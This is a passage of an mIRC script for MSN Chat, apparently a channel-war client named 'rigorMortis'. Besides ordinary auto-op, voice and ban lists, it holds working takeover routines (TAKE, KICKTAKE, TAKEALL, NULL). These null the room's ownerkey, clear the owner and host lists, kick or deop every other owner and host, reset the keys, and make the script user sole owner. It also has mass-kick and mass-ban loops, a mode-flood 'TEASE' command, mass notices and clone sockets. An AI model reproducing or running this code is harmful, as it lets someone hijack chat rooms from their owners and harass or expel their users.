    while ( %i <= $comchan( %n, 0 )) { 
      %cc = $comchan( %n, %i )
      if ( $popup.check( gavoice, %cc ) == on ) {
        msg %cc $+( $chr(3), 5Global.v, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
        $clientQue(MODE %cc +v %n)
      }
      inc %i
    }
  }
  ..$+( Add local, $chr(9), - ... ) {
    var %r, %n, %u
    %n = $$?="nick ?"
    %u = $$?="GKP ?"
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    writeini -n avoice.ini $mid( #, 2 ) %u %n %r
    if ( $popup.check( lavoice, # ) == on ) {
      msg # $+( $chr(3), 5Local.v, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
      $clientQue(MODE # +v %n)
    }
  }
  .Ban
  ..$+( Global, $chr(9), - )
  ...$submenu($subUserListBan($1))
  ..$+( Add, $chr(9), - ... ) {
    var %r, %n, %u, %i, %cc
    %n = $$?="nick ?"
    %u = $$?="GKP ?"
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    writeini -n banlist.ini %u nick %n
    writeini -n banlist.ini %u reason %r
    %c = 1
    while ( %c <= $comchan( %n, 0 ) ) { 
      %cc = $comchan( %n, %c )
      $clientQue( ACCESS %cc add deny $+( *!, $gettok( %u, 1, 64 ), @* 0 :, $mrc $vers ) )
      $clientQue( KICK %cc %n $+( :, 5Banlist, $chr(3), 2 %n ', $chr(3), 5, %r, $chr(3), 2' ) ) 
      inc %c
    }
  }
}
on *:sockopen:roomList.*:{ sockwrite -n $sockname $+( GET /find.msnw?cat=, $gettok( $sock($sockname).mark, 1, 32 ), &page=, $gettok( $sock($sockname).mark, 2, 32 ), HTTP/1.1, $crlf, HOST: chat.msn.com, $crlf, User-Agent: compatible; MSIE 4.0; Windows NT 4.0, $crlf, $crlf ) }
on *:sockread:roomList.*:{
  var %r
  sockread %r
  while ( $sockbr ) {
    if ( $gettok( %r, 2, 60 ) == /a> ) { 
      var %c, %t, %n, %a, %p
      %c = $left( $gettok( %r, 1, 60 ), -5 )
      %c = $mid( %c, 6 ) 
      %c = $roomEncode(%c)
      %t = $wildtok( %r, *fadedtext>*, 1, 60 )
      %t = $gettok( %t, 2, 62 )
      %n = $wildtok( %r, *fadedtext>*, 3, 60 )
      %n = $gettok( %n, 2, 62 )
      %a = $sock($sockname).mark
      %p = $gettok( %a, 2, 32 )
      %a = $gettok( %a, 1, 32 )
      $print( 5, -a, $+( %a %p %c, $chr(3), 2 %n ) )
      if ( $left( $active, 1 ) == $chr(37) ) { privmsg $active $+( $chr(3), 5, %a %p %c, $chr(3), 2 %n ) }
    }
    sockread %r
  }
}
alias -l kickMatch {
  var %m, %ci, %c, %i, %n, %s
  %m = $$1 
  %ci = 1
  while ( %ci <= $sock( rigorMortis.????????????????, 0 ) ) {
    %c = $sock( rigorMortis.????????????????, %ci ).mark
    %i = 1
    while ( %i <= $nick( %c, 0 ) ) {
      %n = $nick( %c, %i )
      if ( %m iswm %n ) { %s = $+( %s, $chr(44), %n ) } 
      inc %i
    }
    sockwrite -n $getSock(%c) $+( ACCESS %c clear owner, $crlf, KICK %c %s :, $chr(3), 5Kickmatch, $chr(3), 2 ', $chr(3), 5, %m, $chr(3), 2', $crlf, PROP %c ownerkey $key, $crlf, PROP %c hostkey $key, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
    inc %ci
  }
}

alias -l banMatch {
  var %m, %ci, %c, %i, %n
  %m = $$1 
  %ci = 1
  while ( %ci <= $sock( rigorMortis.????????????????, 0 ) ) {
    %c = $sock( rigorMortis.????????????????, %ci ).mark
    %i = 1
    while ( %i <= $nick( %c, 0 ) ) {
      %n = $nick( %c, %i )
      if ( %m iswm %n ) {
        $clientQue( ACCESS %c add deny $+( *!, $ial( %n, 1 ).addr ) )
        $clientQue( KICK %c %n $+( :, $chr(3), 5Banmatch, $chr(3), 2 ', $chr(3), 5, %m, $chr(3), 2' ) )
      }
      inc %i
    }
    inc %ci
  }
}

alias -l userScan {
  var %i, %c, %n, %u, %s, %m
  %c = $$1
  %i = 1
  while ( %i <= $nick( %c, 0 ) ) {
    %n = $nick( %c, %i )
    %u = $ial( %n, 1 ).addr
    if ( $popup.check( gaop, %c ) == on ) && ( $ini( aop.ini, global, %u ) ) && ( $+( $chr(32), %n ) !isin %s ) {
      $print( 5, %c, $+( SCAN, $chr(3), 2 Global.q ', $chr(3), 5, %n, $chr(3), 2' ) ) 
      %s = $+( %s, $chr(32), %n )
      %m = $+( %m, +q )
    }
    inc %i
  }
  %i = 1
  while ( %i <= $nick( %c, 0 ) ) { 
    %n = $nick( %c, %i )
    %u = $ial( %n, 1 ).addr
    if ( $popup.check( laop, %c ) == on ) && ( $ini( aop.ini, $mid( %c, 2 ), %u ) ) && ( $+( $chr(32), %n ) !isin %s ) {
      $print( 5, %c, $+( SCAN, $chr(3), 2 Local.q ', $chr(3), 5, %n, $chr(3), 2' ) ) 
      %s = $+( %s, $chr(32), %n )
      %m = $+( %m, +q )
    }
    inc %i
  }
  %i = 1
  while ( %i <= $nick( %c, 0 ) ) {
    %n = $nick( %c, %i )
    %u = $ial( %n, 1 ).addr
    if ( $popup.check( gahost, %c ) == on ) && ( $ini( ahost.ini, global, %u ) ) && ( $+( $chr(32), %n ) !isin %s ) {
      $print( 5, %c, $+( SCAN, $chr(3), 2 Global.o ', $chr(3), 5, %n, $chr(3), 2' ) ) 
      %s = $+( %s, $chr(32), %n )
      %m = $+( %m, +o )
    }
    inc %i
  }
  %i = 1
  while ( %i <= $nick( %c, 0 ) ) { 
    %n = $nick( %c, %i )
    %u = $ial( %n, 1 ).addr
    if ( $popup.check( lahost, %c ) == on ) && ( $ini( ahost.ini, $mid( %c, 2 ), %u ) ) && ( $+( $chr(32), %n ) !isin %s ) {
      $print( 5, %c, $+( SCAN, $chr(3), 2 Local.o ', $chr(3), 5, %n, $chr(3), 2' ) ) 
      %s = $+( %s, $chr(32), %n )
      %m = $+( %m, +o )
    }
    inc %i
  }
  %i = 1
  while ( %i <= $nick( %c, 0 ) ) {
    %n = $nick( %c, %i )
    %u = $ial( %n, 1 ).addr
    if ( $popup.check( gavoice, %c ) == on ) && ( $ini( avoice.ini, global, %u ) ) && ( $+( $chr(32), %n ) !isin %s ) {
      $print( 5, %c, $+( SCAN, $chr(3), 2 Global.v ', $chr(3), 5, %n, $chr(3), 2' ) ) 
      %s = $+( %s, $chr(32), %n )
      %m = $+( %m, +v )
    }
    inc %i
  }
  %i = 1
  while ( %i <= $nick( %c, 0 ) ) { 
    %n = $nick( %c, %i )
    %u = $ial( %n, 1 ).addr
    if ( $popup.check( lavoice, %c ) == on ) && ( $ini( avoice.ini, $mid( %c, 2 ), %u ) ) && ( $+( $chr(32), %n ) !isin %s ) {
      $print( 5, %c, $+( SCAN, $chr(3), 2 Local.v ', $chr(3), 5, %n, $chr(3), 2' ) ) 
      %s = $+( %s, $chr(32), %n )
      %m = $+( %m, +v )
    }
    inc %i
  }
  %i = 1
  while ( %i <= $nick( %c, 0 ) ) { 
    %n = $nick( %c, %i )
    %u = $ial( %n, 1 ).addr
    if ( $popup.check( ban, %c ) == on ) && ( $ini( banlist.ini, global, %u ) ) {
      $print( 5, %c, $+( SCAN, $chr(3), 2 Banlist ', $chr(3), 5, %n, $chr(3), 2' ) )
      $clientQue( ACCESS %c add deny $+( *!, %c 0 : ) )
      $clientQue( KICK %c %n $+( :, $chr(3), Banlist, $chr(3), 2 $readini( banlist.ini, %u, nick ) ', $chr(3), 5, $readini( banlist.ini, %u, reason ), $chr(3), 2' ) )
    }
    inc %i
  }
  $clientQue( MODE %c %m %s )
}

alias -l massBanList {
  var %t, %c, %bn, %i, %n, %s, %a
  %t = $$1
  %c = $$2
  %bn = $getBotNick($getBotSock(%c))
  %i = 1
  if ( %t == 1 ) {
    while ( %i <= $nick( %c, 0 ) ) {
      %n = $nick( %c, %i )
      if ( %n != $me ) && ( %n != %bn ) {
        %a = $ial( %n, 1 ).addr
        writeini -n banlist.ini %a nick %n
        writeini -n banlist.ini %a reason Mass banlist
        $clientQue( $+( ACCESS %c add deny *!, %a 0 : ) )
        $clientQue( KICK %c %n )
      }
      inc %i
    }
  }
  elseif ( %t == 2 ) {
    while ( %i <= $nick( %c, 0, q ) ) {
      %n = $nick( %c, %i, q )
      if ( %n != $me ) && ( %n != %bn ) {
        %a = $ial( %n, 1 ).addr
        $clientQue( $+( ACCESS %c add deny *!, %a 0 : ) )
        $clientQue( KICK %c %n )
        writeini -n banlist.ini %a nick %n
        writeini -n banlist.ini %a reason Mass banlist
      }
      inc %i
    }
  }
  elseif ( %t == 3 ) {
    while ( %i <= $nick( %c, 0, o ) ) {
      %n = $nick( %c, %i, o )
      if ( %n != $me ) && ( %n != %bn ) {
        %a = $ial( %n, 1 ).addr
        $clientQue( $+( ACCESS %c add deny *!, %a 0 : ) )
        $clientQue( KICK %c %n )
        writeini -n banlist.ini %a nick %n
        writeini -n banlist.ini %a reason Mass banlist
      }
      inc %i
    }
  }
  elseif ( %t == 4 ) {
    while ( %i <= $nick( %c, 0, v ) ) {
      %n = $nick( %c, %i, v )
      if ( %n != $me ) && ( %n != %bn ) {
        %a = $ial( %n, 1 ).addr
        $clientQue( $+( ACCESS %c add deny *!, %a 0 : ) )
        $clientQue( KICK %c %n )
        writeini -n banlist.ini %a nick %n
        writeini -n banlist.ini %a reason Mass banlist
      }
      inc %i
    }
  }
  elseif ( %t == 5 ) {
    while ( %i <= $nick( %c, 0, r ) ) {
      %n = $nick( %c, %i, r )
      if ( %n != $me ) && ( %n != %bn ) {
        %a = $ial( %n, 1 ).addr
        $clientQue( $+( ACCESS %c add deny *!, %a 0 : ) )
        $clientQue( KICK %c %n )
        writeini -n banlist.ini %a nick %n
        writeini -n banlist.ini %a reason Mass banlist
      }
      inc %i
    }
  }
}

alias -l massBan {
  var %t, %c, %bn, %i, %n, %s
  %t = $$1
  %c = $$2
  %bn = $getBotNick($getBotSock(%c))
  %i = 1
  if ( %t == 1 ) {
    while ( %i <= $nick( %c, 0 ) ) {
      %n = $nick( %c, %i )
      if ( %n != $me ) && ( %n != %bn ) {
        $clientQue( $+( ACCESS %c add deny *!, $ial( %n, 1 ).addr 0 : ) )
        $clientQue( KICK %c %n )
      }
      inc %i
    }
  }
  elseif ( %t == 2 ) {
    while ( %i <= $nick( %c, 0, q ) ) {
      %n = $nick( %c, %i, q )
      if ( %n != $me ) && ( %n != %bn ) {
        $clientQue( $+( ACCESS %c add deny *!, $ial( %n, 1 ).addr 0 : ) )
        $clientQue( KICK %c %n )
      }
      inc %i
    }
  }
  elseif ( %t == 3 ) {
    while ( %i <= $nick( %c, 0, o ) ) {
      %n = $nick( %c, %i, o )
      if ( %n != $me ) && ( %n != %bn ) {
        $clientQue( $+( ACCESS %c add deny *!, $ial( %n, 1 ).addr 0 : ) )
        $clientQue( KICK %c %n )
      }
      inc %i
    }
  }
  elseif ( %t == 4 ) {
    while ( %i <= $nick( %c, 0, v ) ) {
      %n = $nick( %c, %i, v )
      if ( %n != $me ) && ( %n != %bn ) {
        $clientQue( $+( ACCESS %c add deny *!, $ial( %n, 1 ).addr 0 : ) )
        $clientQue( KICK %c %n )
      }
      inc %i
    }
  }
  elseif ( %t == 5 ) {
    while ( %i <= $nick( %c, 0, r ) ) {
      %n = $nick( %c, %i, r )
      if ( %n != $me ) && ( %n != %bn ) {
        $clientQue( $+( ACCESS %c add deny *!, $ial( %n, 1 ).addr 0 : ) )
        $clientQue( KICK %c %n )
      }
      inc %i
    }
  }
}

alias -l massKick {
  var %t, %c, %bn, %i, %n, %s
  %t = $$1
  %c = $$2
  %bn = $getBotNick($getBotSock(%c))
  %i = 1  
  if ( %t == 1 ) { 
    while ( %i <= $nick( %c, 0 ) ) {
      %n = $nick( %c, %i )
      if ( %n != $me ) && ( %n != %bn ) {  
        if ( $calc( $len(%s) + $len(%n) ) >= 495 ) {
          $clientQue( KICK %c %s )
          $clientQue( ACCESS %c clear owner )
          $clientQue( PROP %c ownerkey $key )
          %s = %n 
        }
        else { %s = $+( %s, $chr(44), %n ) }
      }
      inc %i
    }
  }
  elseif ( %t == 2 ) { 
    while ( %i <= $nick( %c, 0, q ) ) {
      %n = $nick( %c, %i, q )
      if ( %n != $me ) && ( %n != %bn ) {  
        if ( $calc( $len(%s) + $len(%n) ) >= 495 ) {
          $clientQue( KICK %c %s )
          $clientQue( ACCESS %c clear owner )
          $clientQue( PROP %c ownerkey $key )
          %s = %n 
        }
        else { %s = $+( %s, $chr(44), %n ) }
      }
      inc %i
    }
  }
  elseif ( %t == 3 ) { 
    while ( %i <= $nick( %c, 0, o ) ) {
      %n = $nick( %c, %i, o )
      if ( %n != $me ) && ( %n != %bn ) {  
        if ( $calc( $len(%s) + $len(%n) ) >= 495 ) {
          $clientQue( KICK %c %s )
          $clientQue( ACCESS %c clear owner )
          $clientQue( PROP %c ownerkey $key )
          %s = %n 
        }
        else { %s = $+( %s, $chr(44), %n ) }
      }
      inc %i
    }
  }
  elseif ( %t == 4 ) { 
    while ( %i <= $nick( %c, 0, v ) ) {
      %n = $nick( %c, %i, v )
      if ( %n != $me ) && ( %n != %bn ) {  
        if ( $calc( $len(%s) + $len(%n) ) >= 495 ) {
          $clientQue( KICK %c %s )
          $clientQue( ACCESS %c clear owner )
          $clientQue( PROP %c ownerkey $key )
          %s = %n 
        }
        else { %s = $+( %s, $chr(44), %n ) }
      }
      inc %i
    }
  }
  elseif ( %t == 5 ) { 
    while ( %i <= $nick( %c, 0, r ) ) {
      %n = $nick( %c, %i, r )
      if ( %n != $me ) && ( %n != %bn ) {  
        if ( $calc( $len(%s) + $len(%n) ) >= 495 ) {
          $clientQue( KICK %c %s )
          $clientQue( ACCESS %c clear owner )
          $clientQue( PROP %c ownerkey $key )
          %s = %n 
        }
        else { %s = $+( %s, $chr(44), %n ) }
      }
      inc %i
    }
  }
  if ( %s ) { 
    $clientQue( KICK %c %s ) 
    $clientQue( ACCESS %c clear owner )
    $clientQue( PROP %c ownerkey $key )
  }
}

alias -l massMode {
  var %t, %c, %m, %bn, %i, %n, %s
  %t = $$1
  %c = $$2
  %m = $$3 
  %bn = $getBotNick($getBotSock(%c))
  %i = 1
  if ( %t == 1 ) {
    while ( %i <= $nick( %c, 0 ) ) {
      %n = $nick( %c, %i )
      if ( %n != $me ) && ( %n != %bn ) {  
        %s = $+( %s, $chr(32), %n )
        if ( $numtok( %s, 32 ) == 20 ) {
          $clientQue( MODE %c $+( $left( %m, 1 ), $str( $right( %m, 1 ), 20 ) ) %s )
          %s = $chr(32)
        }
      }
      inc %i
    }
  }
  elseif ( %t == 2 ) {
    while ( %i <= $nick( %c, 0, q ) ) {
      %n = $nick( %c, %i, q )
      if ( %n != $me ) && ( %n != %bn ) {   
        %s = $+( %s, $chr(32), %n )
        if ( $numtok( %s, 32 ) == 20 ) {
          $clientQue( MODE %c $+( $left( %m, 1 ), $str( $right( %m, 1 ), 20 ) ) %s )
          %s = $chr(32)
        }
      }
      inc %i
    }
  }
  elseif ( %t == 3 ) {
    while ( %i <= $nick( %c, 0, o ) ) {
      %n = $nick( %c, %i, o )
      if ( %n != $me ) && ( %n != %bn ) {   
        %s = $+( %s, $chr(32), %n )
        if ( $numtok( %s, 32 ) == 20 ) {
          $clientQue( MODE %c $+( $left( %m, 1 ), $str( $right( %m, 1 ), 20 ) ) %s )
          %s = $chr(32)
        }
      }
      inc %i
    }
  }
  elseif ( %t == 4 ) {
    while ( %i <= $nick( %c, 0, v ) ) {
      %n = $nick( %c, %i, v )
      if ( %n != $me ) && ( %n != %bn ) {  
        %s = $+( %s, $chr(32), %n )
        if ( $numtok( %s, 32 ) == 20 ) {
          $clientQue( MODE %c $+( $left( %m, 1 ), $str( $right( %m, 1 ), 20 ) ) %s )
          %s = $chr(32)
        }
      }
      inc %i
    }
  }
  elseif ( %t == 5 ) {
    while ( %i <= $nick( %c, 0, r ) ) {
      %n = $nick( %c, %i, r )
      if ( %n != $me ) && ( %n != %bn ) {   
        %s = $+( %s, $chr(32), %n )
        if ( $numtok( %s, 32 ) == 20 ) {
          $clientQue( MODE %c $+( $left( %m, 1 ), $str( $right( %m, 1 ), 20 ) ) %s )
          %s = $chr(32)
        }
      }
      inc %i
    }
  }
  if ( %s ) { 
    $clientQue( MODE %c $+( $left( %m, 1 ), $str( $right( %m, 1 ), $numtok( %s, 32 ) ) ) %s )
  }
}

alias -l takeAll { 
  var %i, %x, %sk, %c, %bn, %n, %s, %o
  %i = 1
  while ( %i <= $sock( rigorMortis.????????????????, 0 ) ) { 
    %sk = $sock( rigorMortis.????????????????, %i )
    %c = $sock(%sk).mark
    %bn = $getBotNick($getBotSock(%c))
    %x = 1
    %s = ""
    %o = "" 
    $userHalt(%c)
    while ( %x <= $nick( %c, 0, q ) ) {
      %n = $nick( %c, %x, q )
      if ( %n != $me ) && ( %n != %bn ) { %s = $+( %s, $chr(44), %n ) }
      inc %x
    } 
    %x = 1
    while ( %x <= $nick( %c, 0, o ) ) {
      %n = $nick( %c, %x, o )
      if ( %n != $me ) && ( %n != %bn ) { %o = $+( %o, $chr(32), %n ) }
      inc %x
    }
    sockwrite -n $getSock(%c) $+( PROP %c ownerkey :$NULL, $crlf, ACCESS %c clear owner, $crlf, KICK %c %s, $crlf, PROP %c ownerkey $hexString, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $hexString, $crlf, ACCESS %c clear host, $crlf, MODE %c -, $str( o, $numtok( %o, 32 ) ) %o, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
    inc %i
  }
}

alias -l massModeType {
  var %t
  %t = $$1
  %t = $replace( %t, all, 1 )
  %t = $replace( %t, owner, 2 )
  %t = $replace( %t, op, 3 )
  %t = $replace( %t, voice, 4 )
  %t = $replace( %t, reg, 5 )
  return %t
}

on *:sockclose:TK2CHATCHATA0?.????????????????:{
  if ( !%quitChat ) { $connect( $hexString, $sock($sockname).ip, $gettok( $sockname, 1, 46 ) ) }
}

on *:sockread:client.mirc:{
  var %r 
  sockread %r
  tokenize 32 %r
  if ( MSN == $1 ) { 
    chatservers 
    findserver 
    editbox -sf /join $+( $chr(37), $chr(35) ) 
  } 
  elseif ( NICK :?* iswm %r ) { 
    if ( !$sock(TK2CHATCHATA0?.????????????????) ) { sockwrite -n client.mirc $+( :, $me NICK $2 ) }
    elseif ( !$sock(rigorMortis.????????????????) ) { 
      sockclose TK2CHATCHATA0?.????????????????
      sockwrite -n client.mirc $+( :, $me NICK $mid( $2, 2 ) ) 
      $chatServers($mid( $2, 2 ))
    }
    else { $clone($$2) }
  }
  elseif ( JOIN == $1 ) {
    var %c, %s
    %c = $2-
    %c = $roomEncode(%c)
    %s = $sock($getSock(%c))
    if ( $sock(%s).status == active ) { sockwrite -n %s JOIN %c $getKey( $mid( %c, 2 ), q ) }
    else {
      var %i
      %i = 1
      while ( %i <= 6 ) {
        %s = $sock( $+( $msn.host( ns, %i ), .* ), 1 )
        if ( $sock(%s).status == active ) { sockwrite -n %s JOIN %c $getKey( $mid( %c, 2 ), q ) }
        inc %i
      }
    }
  }
  elseif ( PRIVMSG == $1 ) { 
    var %num, %c
    %num = $numtok( $2 ,44)
    if ( $2 == mIRC ) {
      var %s
      %s = $iif( $left( $4, 1 ) == $chr(37), $$getSock($4), $getSock($comchan( $4, 1 )) )
      sockwrite -n %s $mid( $3-, 2 )
    }
    elseif ( $left( $2, 1 ) != $chr(37) ) { 
      if ( $comchan( $2, 1 ) ) {
        %c = $ifmatch 
        sockwrite -n $$getSock(%c) %r
      }
      else { sockwrite -n rigorMortis.* %r }
    }
    else {
      var %i
      %i = 1 
      while ( %i <= %num ) {
        %c = $gettok( $2, %i, 44 )
        sockwrite -n $$getSock(%c) privmsg %c $3- 
        inc %i
      }
    }
  }
  elseif ( KICK == $1 ) {
    var %c, %n
    %c = $iif( $left( $$2, 1 ) == $chr(37), $2, $active )
    %n = $iif( $left( $$2, 1 ) == $chr(37), $3-, $+( $2 :, $3 $mid( $4-, 2 ) ) )
    sockwrite -n $$getSock(%c) KICK %c %n
  } 
  elseif ( KICKM == $1 ) {
    var %c, %n, %p, %ns
    %c = $active
    %n = $$2
    if ( %n isnum ) { sockwrite -n $getSock(%c) $+( ACCESS %c clear owner, $crlf, KICK %c $nick( %c, %n ) :, $crlf, PROP %c ownerkey $key, $crlf, PROP %c hostkey $key, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers ) }
    else {
      var %i
      %i = 1
      while ( %i <= $nick( %c, 0 ) ) { 
        %p = $nick( %c, %i ) 
        if ( %n iswm %p ) && ( %p != $me ) && ( %p != $getBotNick($getBotSock(%c)) ) { %ns = $+( %ns, $chr(44), %p ) }
        inc %i
      }
      if ( %ns ) { sockwrite -n $getSock(%c) $+( ACCESS %c clear owner, $crlf, KICK %c %ns :, $chr(3), 5Kickmatch, $chr(3), 2 ', $chr(3), 5, %n, $chr(3), 2', $crlf, PROP %c ownerkey $key, $crlf, PROP %c hostkey $key, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers ) }
    }
  }
  elseif ( BANM == $1 ) {
    var %c, %n, %p, %ns
    %c = $active
    %n = $$2
    if ( %n isnum ) { sockwrite -n $getSock(%c) $+( ACCESS %c clear owner, $crlf, ACCESS %c add deny *!, $ial($nick( %c, %n )).addr, $crlf, KICK %c $nick( %c, %n ) :, $crlf, PROP %c ownerkey $key, $crlf, PROP %c hostkey $key, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers ) }
    else {
      var %i
      %i = 1
      while ( %i <= $nick( %c, 0 ) ) { 
        %p = $nick( %c, %i ) 
        if ( %n iswm %p ) && ( %p != $me ) && ( %p != $getBotNick($getBotSock(%c)) ) { 
          sockwrite -n $getSock(%c) $+( ACCESS %c add deny *!, $ial(%p).addr 0 : )
          %ns = $+( %ns, $chr(44), %p ) 
        }
        inc %i
      }
      if ( %ns ) { sockwrite -n $getSock(%c) $+( ACCESS %c clear owner, $crlf, KICK %c %ns :, $chr(3), 5Banmatch, $chr(3), 2 ', $chr(3), 5, %n, $chr(3), 2', $crlf, PROP %c ownerkey $key, $crlf, PROP %c hostkey $key, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers ) }
    }
  }
  elseif ( MODE == $1 ) {
    if ( $left( $2, 1 ) == $chr(37) ) { sockwrite -n $getSock($2) $1- }
    else { sockwrite -n $getSock($active) $1- }
  }
  elseif ( CREATE == $1 ) {
    var %c, %s, %p
    %c = $roomEncode($$2-)
    %s = $$sock( findServer.????????????????, 1 )
    %p = $key
    sockwrite -n %s create CP %c rigorMortis l 510 EN-US 1 $mid( %p, 2 ) $mrc $vers
    sockmark %s %c
    $setKey( $mid( %c, 2 ), q, %p )
  }
  elseif ( PART == $1 ) && ( $left( $2, 1 ) == $chr(37) ) { 
    var %i, %c
    %i = 1 
    while ( %i <= $numtok( $2, 44 ) ) {
      var %a
      %c = $gettok( $2, %i, 44 )
      %a = $iif( $me isowner %c, owner, $iif( $me isop %c, host, 0 ) )
      sockwrite -n $$getSock(%c) $+( $iif( %a, $+( ACCESS %c add %a *!, %gate 0 :, $mrc $vers, $crlf, ACCESS %c add voice *!, $gettok( %gate, 1, 64 ), @* 0 :, $mrc $vers, $crlf ) ), PART %c )
      inc %i
    }
  }
  elseif ( CPART == $1 ) {
    var %c
    %c = $iif( $2, $2, $active ) 
    sockclose $getSock(%c)
    $delSock(%c)
    sockwrite -n client.mirc $+( :, $me ) PART %c
  }
  elseif ( CJOIN == $1 ) {
    var %c, %s
    %c = $2-
    %c = $roomEncode(%c)
    $delSock(%c)
    var %i
    %i = 1
    while ( %i <= 6 ) {
      %s = $sock( $+( $msn.host( ns, %i ), .* ), 1 )
      if ( $sock(%s).status == active ) { sockwrite -n %s JOIN %c $getKey( $mid( %c, 2 ), q ) }
      inc %i
    }
  }
  elseif ( QUIT == $1 ) {
    inc -u5 %quit
    sockclose TK2CHATCHATA0?.???????????????? 
    sockclose clone.????????????????
    var %i 
    %i = 1
    while ( %i <= $sock( rigorMortis.????????????????, 0 ) ) {
      sockwrite -n client.mirc $+( :, $me PART $sock( rigorMortis.????????????????, %i ).mark )
      inc %i
    }
    sockclose rigorMortis.????????????????
    sockclose bot.????????????????
  }
  elseif ( LISTX == $1 ) { $roomList( $2, $3 ) }
  elseif ( TAKE == $1 ) {
    var %i, %c, %bn, %n, %s
    %i = 1
    %c = $iif( $2, $2, $active )
    %bn = $getBotNick($getBotSock(%c))
    $userHalt(%c)
    while ( %i <= $nick( %c, 0 ) ) {
      %n = $nick( %c, %i )
      if ( %n != $me ) && ( %n != %bn ) { %s = $+( %s, $chr(32), %n ) }
      inc %i
    } 
    sockwrite -n $getSock(%c) $+( PROP %c ownerkey :$NULL, $crlf, ACCESS %c clear owner, $crlf, MODE %c -, $str( q, $numtok( %s, 32 ) ) %s, $crlf, PROP %c ownerkey $hexString, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $hexString, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
  }
  elseif ( KICKTAKE == $1 ) {
    var %i, %c, %bn, %n, %s, %o
    %i = 1
    %c = $iif( $2, $2, $active )
    %bn = $getBotNick($getBotSock(%c))
    $userHalt(%c)
    while ( %i <= $nick( %c, 0, q ) ) {
      %n = $nick( %c, %i, q )
      if ( %n != $me ) && ( %n != %bn ) { %s = $+( %s, $chr(44), %n ) }
      inc %i
    } 
    %i = 1
    while ( %i <= $nick( %c, 0, o ) ) {
      %n = $nick( %c, %i, o )
      if ( %n != $me ) && ( %n != %bn ) { %o = $+( %o, $chr(32), %n ) }
      inc %i
    }
    sockwrite -n $getSock(%c) $+( PROP %c ownerkey :$NULL, $crlf, ACCESS %c clear owner, $crlf, KICK %c %s, $crlf, PROP %c ownerkey $hexString, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $hexString, $crlf, ACCESS %c clear host, $crlf, MODE %c -, $str( o, $numtok( %o, 32 ) ) %o, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
  }
  elseif ( TAKEALL == $1 ) { $takeAll }
  elseif ( NULL == $1 ) {
    var %i, %c, %bn, %n, %s, %o
    %i = 1
    %c = $iif( $2, $2, $active )
    %bn = $getBotNick($getBotSock(%c))
    $userHalt(%c)
    while ( %i <= $nick( %c, 0, q ) ) {
      %n = $nick( %c, %i, q )
      if ( %n != $me ) && ( %n != %bn ) { %s = $+( %s, $chr(32), %n ) }
      inc %i
    } 
    %i = 1
    while ( %i <= $nick( %c, 0, o ) ) {
      %n = $nick( %c, %i, o )
      if ( %n != $me ) && ( %n != %bn ) { %o = $+( %o, $chr(32), %n ) }
      inc %i
    }
    sockwrite -n $getSock(%c) $+( ACCESS %c clear owner, $crlf, PROP %c ownerkey :, $crlf, MODE %c -, $str( q, $numtok( %s, 32 ) ), $str( o, $numtok( %o, 32 ) ) %s %o, $crlf, PROP %c ownerkey $hexString, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $hexString, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
  }
  elseif ( MASSQ == $1 ) {
    var %i, %c, %bn, %n, %s
    %i = 1
    %c = $iif( $2, $2, $active )
    %bn = $getBotNick($getBotSock(%c))
    while ( %i <= $nick( %c, 0 ) ) {
      %n = $nick( %c, %i )
      if ( %n != $me ) && ( %n != %bn ) && ( %n !isowner %c ) { %s = $+( %s, $chr(32), %n ) }
      inc %i
    }
    sockwrite -n $getSock(%c) $+( MODE %c +, $str( q, $numtok( %s, 32 ) ) %s, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
  }
  elseif ( FINDU == $1 ) { sockwrite -n $$sock(findserver.????????????????) $1-2 }
  elseif ( WHO == $1 ) { 
    var %i, %s
    %i = 1
    while ( %i <= $sock( TK2CHATCHATA0?.????????????????, 0 ) ) {
      %s = $sock( TK2CHATCHATA0?.????????????????, %i )  
      sockwrite -n %s WHO $$2
      inc %i
    }
  }
  elseif ( WHOIS == $1 ) {
    var %c
    %c = $active
    sockwrite -n $getSock(%c) WHOIS $$2
  }
  elseif ( NOTICE == $1 ) { 
    var %c
    %c = $iif( $left( $$2, 1 ) == $chr(37), $$2, $comchan( $$2, 1 ) )
    sockwrite -n $$getSock(%c) NOTICE $2-
  } 
  elseif ( MASSNOTICE == $1 ) {
    var %c, %s, %i
    %c = $active
    %s = $$getSock(%c)
    %i = 1
    while ( %i <= $nick( %c, 0 ) ) {
      $clientQue( NOTICE $nick( %c, %i ) :massNotice - $2- )
      inc %i
    }
  }
  elseif ( TEASE == $1 ) {
    var %n, %c, %i, %m, %ma
    %c = $active
    %n = $$3
    %n = $str( %n $chr(32), 26 )
    %m = $$2
    %m = $+( +, %m, -, %m )
    %m = $str( %m, 13 )
    %ma = $iif( $4, $4, 5 )
    %i = 1
    while ( %i <= %ma ) {
      $clientQue( MODE %c %m %n )
      inc %i
    }
  }
  elseif ( USERSCAN == $1 ) { $userScan($active) }
  elseif ( BANMATCH == $1 ) { $banMatch($$2) }
  elseif ( KICKMATCH == $1 ) { $kickMatch($$2) }
  elseif ( HOPALL == $1 ) { 
    var %i, %c
    %i = 1
    while ( %i <= $sock( rigorMortis.????????????????, 0 ) ) {
      %c = $sock( rigorMortis.????????????????, %i ).mark
      hop %c
      inc %i
    }
  }
  elseif ( MASSOWNER == $1 ) {
    var %c, %t
    %c = $active
